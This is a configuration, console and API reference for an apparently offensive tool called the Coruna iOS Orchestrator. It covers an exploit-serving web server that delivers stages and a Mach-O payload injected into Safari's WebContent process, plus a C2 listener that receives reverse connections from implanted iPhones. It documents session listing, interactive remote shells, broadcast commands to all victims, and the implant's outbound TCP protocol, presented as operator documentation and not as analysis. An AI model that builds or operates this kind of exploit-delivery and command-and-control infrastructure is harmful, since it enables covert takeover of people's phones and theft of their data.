# API, Configuration & Console Reference — Coruna iOS Orchestrator

This document provides a complete reference for configuring, operating, and interacting with the Coruna iOS Orchestrator.

---

## 1. Configuration Reference

Coruna uses a tiered configuration system:
1. **Environment Variables** (Highest precedence, recommended for Docker/Kubernetes)
2. **`config.json`** (File-based configuration)
3. **Internal Defaults** (Fallback if neither is specified)

### Configuration Schema

| Key (`config.json`) | Environment Variable(s) | Type | Default | Description |
|---|---|---|---|---|
| `web_server_ip` | `WEB_SERVER_IP`, `CORUNA_WEB_SERVER_IP`, `WEB_IP` | string | `"0.0.0.0"` | Network interface to bind the HTTP exploit web server. |
| `web_server_port` | `WEB_SERVER_PORT`, `CORUNA_WEB_SERVER_PORT`, `WEB_PORT`, `PORT` | integer | `80` | TCP port for the HTTP exploit web server. |
| `c2_bind` | `C2_BIND`, `CORUNA_C2_BIND` | string | `"0.0.0.0"` | Network interface to bind the C2 TCP listener. |
| `c2_port` | `C2_PORT`, `CORUNA_C2_PORT` | integer | `8080` | TCP port for inbound C2 reverse connections. |
| `exploit_templates_dir` | `EXPLOIT_TEMPLATES_DIR`, `CORUNA_EXPLOIT_TEMPLATES_DIR` | string | `"exploits/"` | Directory path containing exploit chains (e.g. `exploits/coruna`). |
| `static_files_dir` | `STATIC_FILES_DIR`, `CORUNA_STATIC_FILES_DIR` | string | `"web_server/static/"` | Directory path containing static assets served under `/static/`. |
| — | `CORUNA_HEADLESS` | boolean / int (`1`/`0`) | `0` (auto) | Set to `1` to force daemon mode and bypass interactive stdin prompts. |

### Example `config.json`
```json
{
    "web_server_ip": "0.0.0.0",
    "web_server_port": 80,
    "c2_bind": "0.0.0.0",
    "c2_port": 8080,
    "exploit_templates_dir": "exploits/",
    "static_files_dir": "web_server/static/"
}
```

---

## 2. Interactive Console Reference

When running in an interactive terminal (`docker run -it`, `docker compose run coruna`, or direct `python3 main.py`), Coruna starts the main interactive command loop:

```text
(coruna)> 
```

### Main Menu Commands

| Command | Aliases | Syntax | Description |
|---|---|---|---|
| `list` | `ls`, `sessions` | `list` | Displays a table of all active C2 sessions. |
| `use` | — | `use <session_id>` | Attaches to an active session and opens an interactive shell. |
| `help` | `h`, `?` | `help` | Prints available console commands. |
| `quit` | `exit` | `quit` | Gracefully shuts down the web server, closes all C2 connections, and terminates. |

#### Example: Listing Active Sessions
```text
(coruna)> list
  [4f8b1a92] 192.168.1.45 2026-10-31 21:30:15
  [c7e39d01] 10.0.0.12 2026-10-31 21:32:00
```

---

### Session Shell (`(shell)> `)

Attaching to a session using `use <session_id>` switches the prompt to the interactive sub-shell:

```text
(coruna)> use 4f8b1a92

[*] Connected to 192.168.1.45 (session 4f8b1a92). Type 'exit' or 'back' to return.

(shell)> id
uid=501(mobile) gid=501(mobile) groups=501(mobile)
(shell)> uname -a
Darwin iPhone 21.3.0 Darwin Kernel Version 21.3.0: Wed Jan  5 21:37:58 PST 2022; root:xnu-8019.80.4~1/RELEASE_ARM64_T8015 iPhone10,6
```

#### Shell Sub-Commands

| Command | Action |
|---|---|
| `exit` / `back` / `quit` | Returns to the main `(coruna)>` menu without terminating the remote session. |
| `<any command>` | Sends the command string followed by `\n` across the TCP socket to the remote implant and prints returned stdout/stderr. |

---

## 3. Web Exploit Server HTTP Endpoints

The Web Server delivers the exploit stages, loaders, and payloads.

| Route | Method | Description | Content-Type |
|---|---|---|---|
| `/` | `GET` | Redirects to `/coruna/group.html`. | `text/html` (302 Found) |
| `/coruna` | `GET` | Redirects to `/coruna/group.html`. | `text/html` (302 Found) |
| `/coruna/group.html` | `GET` | Main loader and exploit orchestrator. | `text/html; charset=utf-8` |
| `/coruna/*.js` | `GET` | Stage scripts, modules, and utilities. | `application/javascript; charset=utf-8` |
| `/coruna/payloads/manifest.json` | `GET` | Payload manifest defining hashes and entries. | `application/json` |
| `/coruna/payloads/bootstrap.dylib` | `GET` | Primary Mach-O dylib payload injected into WebContent. | `application/octet-stream` |
| `/coruna/payloads/<hash>/*` | `GET` | Hash-specific sub-payloads and binaries. | `application/octet-stream` |
| `/static/*` | `GET` | Static assets from `web_server/static/`. | Inferred from file extension |
| `/ui` (also `/dashboard`, `/admin`) | `GET` | Interactive Operator Web Dashboard UI. | `text/html; charset=utf-8` |
| `/api/ws` | `GET` (WS) | Live bidirectional WebSocket for C2 shell streaming & HTTP telemetry. | WebSocket (`application/json`) |
| `/api/status` | `GET` | Server health, uptime, bind addresses, and counters. | `application/json` |
| `/api/sessions` | `GET` | Active and historical C2 sessions list. | `application/json` |
| `/api/sessions/{id}` | `GET` / `DELETE` | Fetch session transcript or terminate an active session. | `application/json` |
| `/api/sessions/{id}/command` | `POST` | Dispatch a shell command to session `{id}`. | `application/json` |
| `/api/sessions/broadcast` | `POST` | Broadcast a shell command across all active sessions. | `application/json` |
| `/api/sessions/test` | `POST` | Spawn a local loopback C2 test session for UI verification. | `application/json` |
| `/api/logs` | `GET` / `DELETE` | Fetch or clear HTTP & C2 telemetry event logs. | `application/json` |
| `/api/payloads` | `GET` | List exploit stages, sizes, and `manifest.json` bundles. | `application/json` |
| `/api/payloads/source` | `GET` | Inspect source of an exploit stage file (`?file=<name>`). | `application/json` |
| `/api/config` | `GET` / `POST` | View or update `config.json` settings. | `application/json` |

---

## 4. C2 Protocol Specification

The C2 communication operates over raw asynchronous TCP sockets:

1. **Connection Initiation**: The injected `bootstrap.dylib` connects outbound to `<C2_IP>:<C2_PORT>` (default `8080`).
2. **Session Registration**: The server registers the socket into `C2Server.active_sessions` with a unique 8-character hex ID.
3. **Command Dispatch**: When an operator issues a command, `Session.send_command(cmd)` encodes the command to UTF-8, appends `\n`, and writes to `asyncio.StreamWriter`.
4. **Output Reception**: Output from the implant is read via `StreamReader.read(65536)` and appended to `Session.output_buffer`.
5. **Teardown**: When the target device disconnects or the operator issues `quit`, the writer is closed and the session is purged from `active_sessions`.
